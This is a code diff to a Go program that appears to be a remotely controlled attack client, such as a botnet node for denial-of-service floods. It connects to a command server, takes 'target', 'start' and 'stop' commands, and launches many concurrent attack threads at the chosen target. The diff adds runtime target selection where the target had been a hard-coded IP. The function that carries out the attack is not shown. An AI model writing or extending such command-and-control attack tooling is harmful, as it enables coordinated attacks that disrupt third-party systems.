@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"fmt"
+	"strings"
 	"sync"
 )
 
@@ -17,10 +18,7 @@ func main() {
 	// server socket details and setup
 	server_addr := SERVER_IP + ":" + "8080"
 
-	// target socket details and setup
-	var target address
-	target.ip = TARGET_IP
-	target.port = "80"
+	var target string
 
 	// connect server socket
 	fmt.Println("Connecting to server...")
@@ -31,13 +29,18 @@ func main() {
 		cmd_buf := make([]byte, 1024)
 		receiveCommand(server_socket, &cmd_buf)
 		cmd_buf = bytes.Trim(cmd_buf, "\x00")
-		if string(cmd_buf) == "start" {
+		cmd_args := strings.Split(string(cmd_buf), " ")
+		cmd_arg1 := cmd_args[0]
+		if cmd_arg1 == "target" {
+			target = cmd_args[1]
+			fmt.Println("Target has been set to " + target)
+		} else if cmd_arg1 == "start" {
 			fmt.Println("Executing attack...")
 			running = 1
 			for i := 0; i < NUM_THREADS; i++ {
 				go attack(target)
 			}
-		} else if string(cmd_buf) == "stop" {
+		} else if cmd_arg1 == "stop" {
 			fmt.Println("Stopping attack...")
 			threads.Wait()
 		}
